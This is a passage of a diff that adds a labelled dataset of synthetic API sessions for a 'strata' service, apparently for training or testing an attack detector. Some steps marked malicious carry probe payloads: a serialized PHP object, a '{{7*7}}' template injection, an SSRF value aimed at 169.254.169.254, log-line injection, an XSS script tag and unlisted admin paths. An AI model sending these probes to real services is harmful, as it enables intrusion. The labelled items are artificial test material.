+        "body": {
+          "siteId": "site-1",
+          "unitName": "Test",
+          "layerDepth": 1.0,
+          "metadata": "O:5:\"Class\":0:{}"
+        },
+        "note": "The stratum creation body includes a serialized object string."
+      },
+      {
+        "id": "sess166-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token166"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess167",
+    "client_ip": "192.0.2.76",
+    "steps": [
+      {
+        "id": "sess167-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "anat",
+          "password": "secretpassword67"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess167-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token167"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess167-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token167"
+        },
+        "body": null,
+        "note": "The user opens stratum 6701."
+      },
+      {
+        "id": "sess167-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token167"
+        },
+        "body": null,
+        "note": "The user returns to stratum 6702."
+      }
+    ]
+  },
+  {
+    "session_id": "sess168",
+    "client_ip": "192.0.2.77",
+    "steps": [
+      {
+        "id": "sess168-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yoav",
+          "password": "secretpassword68"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess168-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token168",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent header."
+      },
+      {
+        "id": "sess168-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token168"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess168-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token168"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess168-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token168"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess169",
+    "client_ip": "192.0.2.78",
+    "steps": [
+      {
+        "id": "sess169-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "ruth",
+          "password": "secretpassword69"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess169-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token169"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess169-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token169"
+        },
+        "body": null,
+        "note": "The user opens stratum 6901."
+      },
+      {
+        "id": "sess169-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-5555",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token169"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess169-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-6902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token169"
+        },
+        "body": null,
+        "note": "The user returns to another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess170",
+    "client_ip": "192.0.2.79",
+    "steps": [
+      {
+        "id": "sess170-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "david",
+          "password": "secretpassword70"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess170-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token170"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess170-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token170"
+        },
+        "body": null,
+        "note": "The user opens stratum 7001."
+      },
+      {
+        "id": "sess170-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token170"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7002."
+      }
+    ]
+  },
+  {
+    "session_id": "sess171",
+    "client_ip": "192.0.2.80",
+    "steps": [
+      {
+        "id": "sess171-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "rachel",
+          "password": "secretpassword71"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess171-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token171"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess171-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token171"
+        },
+        "body": null,
+        "note": "The user opens stratum 7101."
+      },
+      {
+        "id": "sess171-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-7101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token171",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.1,
+          "soilConsistency": "{{7*7}}"
+        },
+        "note": "The update body includes a template expression."
+      },
+      {
+        "id": "sess171-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token171"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess172",
+    "client_ip": "192.0.2.81",
+    "steps": [
+      {
+        "id": "sess172-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "moshe",
+          "password": "secretpassword72",
+          "clientVersion": "1.0"
+        },
+        "note": "The request body contains a harmless extra field."
+      },
+      {
+        "id": "sess172-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token172"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess172-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token172"
+        },
+        "body": null,
+        "note": "The user opens stratum 7201."
+      },
+      {
+        "id": "sess172-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token172"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7202."
+      }
+    ]
+  },
+  {
+    "session_id": "sess173",
+    "client_ip": "192.0.2.82",
+    "steps": [
+      {
+        "id": "sess173-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "sarah",
+          "password": "secretpassword73"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess173-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token173"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess173-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token173"
+        },
+        "body": null,
+        "note": "The user opens stratum 7301."
+      },
+      {
+        "id": "sess173-s04",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/metrics",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token173"
+        },
+        "body": null,
+        "note": "The user accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess173-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token173"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess174",
+    "client_ip": "192.0.2.83",
+    "steps": [
+      {
+        "id": "sess174-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "avraham",
+          "password": "secretpassword74"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess174-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token174"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess174-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token174"
+        },
+        "body": null,
+        "note": "The user opens stratum 7401."
+      },
+      {
+        "id": "sess174-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token174"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7402."
+      }
+    ]
+  },
+  {
+    "session_id": "sess175",
+    "client_ip": "192.0.2.84",
+    "steps": [
+      {
+        "id": "sess175-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "lea",
+          "password": "secretpassword75",
+          "noteText": "Session initialization."
+        },
+        "note": "The request body contains a technical word in a noteText field."
+      },
+      {
+        "id": "sess175-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token175"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess175-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token175"
+        },
+        "body": null,
+        "note": "The user opens stratum 7501."
+      },
+      {
+        "id": "sess175-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token175"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7502."
+      }
+    ]
+  },
+  {
+    "session_id": "sess176",
+    "client_ip": "192.0.2.85",
+    "steps": [
+      {
+        "id": "sess176-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "jacob",
+          "password": "secretpassword76"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess176-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token176"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess176-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token176"
+        },
+        "body": null,
+        "note": "The user opens stratum 7601."
+      },
+      {
+        "id": "sess176-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token176",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Unit",
+          "layerDepth": 1.0,
+          "target": "http://169.254.169.254/"
+        },
+        "note": "The stratum creation body includes an internal address value."
+      },
+      {
+        "id": "sess176-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token176"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess177",
+    "client_ip": "192.0.2.86",
+    "steps": [
+      {
+        "id": "sess177-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "rebecca",
+          "password": "secretpassword77"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess177-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token177"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess177-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token177"
+        },
+        "body": null,
+        "note": "The user opens stratum 7701."
+      },
+      {
+        "id": "sess177-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token177"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7702."
+      }
+    ]
+  },
+  {
+    "session_id": "sess178",
+    "client_ip": "192.0.2.87",
+    "steps": [
+      {
+        "id": "sess178-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"
+        },
+        "body": {
+          "username": "isaac",
+          "password": "secretpassword78"
+        },
+        "note": "The request uses an old browser user-agent header."
+      },
+      {
+        "id": "sess178-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token178"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess178-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token178"
+        },
+        "body": null,
+        "note": "The user opens stratum 7801."
+      },
+      {
+        "id": "sess178-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token178"
+        },
+        "body": null,
+        "note": "The user returns to stratum 7802."
+      }
+    ]
+  },
+  {
+    "session_id": "sess179",
+    "client_ip": "192.0.2.88",
+    "steps": [
+      {
+        "id": "sess179-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "joseph",
+          "password": "secretpassword79"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess179-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token179"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess179-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token179"
+        },
+        "body": null,
+        "note": "The user opens stratum 7901."
+      },
+      {
+        "id": "sess179-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-7901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token179",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.5,
+          "soilConsistency": "loam\n2026-10-28 11:07:00 [WARN] Memory corruption warning"
+        },
+        "note": "The update body includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess179-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-7902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token179"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess180",
+    "client_ip": "192.0.2.89",
+    "steps": [
+      {
+        "id": "sess180-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "benjamin",
+          "password": "secretpassword80"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess180-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token180"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess180-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token180"
+        },
+        "body": null,
+        "note": "The user opens stratum 8001."
+      },
+      {
+        "id": "sess180-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token180"
+        },
+        "body": null,
+        "note": "The user returns to stratum 8002."
+      }
+    ]
+  },
+  {
+    "session_id": "sess181",
+    "client_ip": "192.0.2.90",
+    "steps": [
+      {
+        "id": "sess181-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "dan",
+          "password": "secretpassword81"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess181-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "status": "active\nclosed"
+        },
+        "headers": {
+          "Authorization": "Bearer token181"
+        },
+        "body": null,
+        "note": "The query parameter contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess181-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token181"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess181-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token181"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess182",
+    "client_ip": "192.0.2.91",
+    "steps": [
+      {
+        "id": "sess182-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "gad",
+          "password": "secretpassword82"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess182-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token182"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess182-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token182"
+        },
+        "body": null,
+        "note": "The user opens stratum 8201."
+      },
+      {
+        "id": "sess182-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token182"
+        },
+        "body": null,
+        "note": "The user returns to stratum 8202."
+      }
+    ]
+  },
+  {
+    "session_id": "sess183",
+    "client_ip": "192.0.2.92",
+    "steps": [
+      {
+        "id": "sess183-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "asher",
+          "password": "secretpassword83"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess183-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token183"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess183-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token183"
+        },
+        "body": null,
+        "note": "The user opens stratum 8301."
+      },
+      {
+        "id": "sess183-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/admin/backup",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token183"
+        },
+        "body": null,
+        "note": "The user accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess183-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token183"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess184",
+    "client_ip": "192.0.2.93",
+    "steps": [
+      {
+        "id": "sess184-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "naphtali",
+          "password": "secretpassword84"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess184-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token184"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess184-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-8401",
+        "query": {
+          "info": "Stratum's details"
+        },
+        "headers": {
+          "Authorization": "Bearer token184"
+        },
+        "body": null,
+        "note": "The query parameter contains an apostrophe in descriptive text."
+      },
+      {
+        "id": "sess184-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token184"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess185",
+    "client_ip": "192.0.2.94",
+    "steps": [
+      {
+        "id": "sess185-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "zebulun",
+          "password": "secretpassword85"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess185-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token185"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess185-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token185"
+        },
+        "body": null,
+        "note": "The user opens stratum 8501."
+      },
+      {
+        "id": "sess185-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token185"
+        },
+        "body": null,
+        "note": "The user returns to stratum 8502."
+      }
+    ]
+  },
+  {
+    "session_id": "sess186",
+    "client_ip": "192.0.2.95",
+    "steps": [
+      {
+        "id": "sess186-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "issachar",
+          "password": "secretpassword86"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess186-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token186"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess186-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token186"
+        },
+        "body": null,
+        "note": "The user opens stratum 8601."
+      },
+      {
+        "id": "sess186-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token186"
+        },
+        "body": null,
+        "note": "The user returns to stratum 8602."
+      }
+    ]
+  },
+  {
+    "session_id": "sess187",
+    "client_ip": "192.0.2.96",
+    "steps": [
+      {
+        "id": "sess187-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "simeon",
+          "password": "secretpassword87"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess187-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token187"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess187-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token187"
+        },
+        "body": null,
+        "note": "The user opens stratum 8701."
+      },
+      {
+        "id": "sess187-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-8701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token187",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.2,
+          "soilConsistency": "<script>alert('xss')</script>"
+        },
+        "note": "The update body includes a browser-executed code injection attempt."
+      },
+      {
+        "id": "sess187-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token187"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess188",
+    "client_ip": "192.0.2.97",
+    "steps": [
+      {
+        "id": "sess188-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "levi",
+          "password": "secretpassword88"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess188-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token188"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess188-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "filter": "active\nlist"
+        },
+        "headers": {
+          "Authorization": "Bearer token188"
+        },
+        "body": null,
+        "note": "The query parameter contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess188-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token188"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess188-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token188"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess189",
+    "client_ip": "192.0.2.98",
+    "steps": [
+      {
+        "id": "sess189-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "judah",
+          "password": "secretpassword89"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess189-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token189"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess189-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token189"
+        },
+        "body": null,
+        "note": "The user opens stratum 8901."
+      },
+      {
+        "id": "sess189-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-8902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token189"
+        },
+        "body": null,
+        "note": "The user returns to stratum 8902."
+      }
+    ]
+  },
+  {
+    "session_id": "sess190",
+    "client_ip": "192.0.2.99",
+    "steps": [
+      {
+        "id": "sess190-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "ephraim",
+          "password": "secretpassword90"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess190-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token190"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess190-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token190"
+        },
+        "body": null,
+        "note": "The user opens stratum 9001."
+      },
+      {
